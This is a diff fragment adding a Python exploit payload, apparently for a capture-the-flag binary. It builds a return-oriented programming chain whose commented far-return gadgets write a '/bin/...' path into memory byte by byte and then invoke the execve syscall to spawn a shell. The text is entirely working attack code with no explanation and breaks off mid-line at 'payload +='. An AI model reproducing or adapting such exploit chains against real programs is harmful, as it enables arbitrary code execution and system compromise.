@@ -1,0 +1,61 @@
+payload = p64(0x402c03)
+#0x402c03: pop rax ; retf 1
+payload += p64(0x4210e7)+p32(0x4122d5)+p32(0x33)+"\x00"*1
+# 0x4122d5: pop rcx ; retf
+payload += p64(0x2f)+p32(0x4149bf)+p32(0x33)
+# 0x4149bf: add byte ptr [rax - 0x77], cl ; fucompi st(0) ; retf
+payload += p32(0x402c03)+p32(0x33)
+# 0x402c03: pop rax ; retf 1
+payload += p64(0x4210e8)+p32(0x4122d5)+p32(0x33)+"\x00"*1
+# 0x4122d5: pop rcx ; retf
+payload += p64(0x62)+p32(0x4149bf)+p32(0x33)
+# 0x4149bf: add byte ptr [rax - 0x77], cl ; fucompi st(0) ; retf
+payload += p32(0x402c03)+p32(0x33)
+# 0x402c03: pop rax ; retf 1
+payload += p64(0x4210e9)+p32(0x4122d5)+p32(0x33)+"\x00"*1
+# 0x4122d5: pop rcx ; retf
+payload += p64(0x69)+p32(0x4149bf)+p32(0x33)
+# 0x4149bf: add byte ptr [rax - 0x77], cl ; fucompi st(0) ; retf
+payload += p32(0x402c03)+p32(0x33)
+# 0x402c03: pop rax ; retf 1
+payload += p64(0x4210ea)+p32(0x4122d5)+p32(0x33)+"\x00"*1
+# 0x4122d5: pop rcx ; retf
+payload += p64(0x6e)+p32(0x4149bf)+p32(0x33)
+# 0x4149bf: add byte ptr [rax - 0x77], cl ; fucompi st(0) ; retf
+payload += p32(0x402c03)+p32(0x33)
+# 0x402c03: pop rax ; retf 1
+payload += p64(0x4210eb)+p32(0x4122d5)+p32(0x33)+"\x00"*1
+# 0x4122d5: pop rcx ; retf
+payload += p64(0x2f)+p32(0x4149bf)+p32(0x33)
+# 0x4149bf: add byte ptr [rax - 0x77], cl ; fucompi st(0) ; retf
+payload += p32(0x402c03)+p32(0x33)
+# 0x402c03: pop rax ; retf 1
+payload += p64(0x4210ec)+p32(0x4122d5)+p32(0x33)+"\x00"*1
+# 0x4122d5: pop rcx ; retf
+payload += p64(0x66)+p32(0x4149bf)+p32(0x33)
+# 0x4149bf: add byte ptr [rax - 0x77], cl ; fucompi st(0) ; retf
+payload += p32(0x402c03)+p32(0x33)
+# 0x402c03: pop rax ; retf 1
+payload += p64(0x4210ed)+p32(0x4122d5)+p32(0x33)+"\x00"*1
+# 0x4122d5: pop rcx ; retf
+payload += p64(0x68)+p32(0x4149bf)+p32(0x33)
+# 0x4149bf: add byte ptr [rax - 0x77], cl ; fucompi st(0) ; retf
+payload += p32(0x402c03)+p32(0x33)
+# 0x402c03: pop rax ; retf 1
+payload += p64(0x4210ee)+p32(0x4122d5)+p32(0x33)+"\x00"*1
+# 0x4122d5: pop rcx ; retf
+payload += p64(0x0)+p32(0x4149bf)+p32(0x33)
+# 0x4149bf: add byte ptr [rax - 0x77], cl ; fucompi st(0) ; retf
+payload += p32(0x402c03)+p32(0x33)
+# 0x402c03: pop rax ; retf 1
+payload += p64(0x0)+p32(0x409aa6)+p32(0x33)+"\x00"*1
+# 0x0000000000409aa6: cdq; ret; 
+payload += p64(0x4017d3)
+# 0x00000000004017d3: pop rdi; ret; 
+payload += p64(0x421070)+p64(0x402c03)
+# 0x402c03: pop rax ; retf 1
+payload += p64(0x3b)+p32(0x4017d1)+p32(0x33)+"\x00"*1
+# 0x00000000004017d1: pop rsi; pop r15; ret; 
+payload += p64(0x0)+p64(0x0)+p64(0x4075eb)
+# 0x00000000004075eb: syscall; ret; 
+payload +=
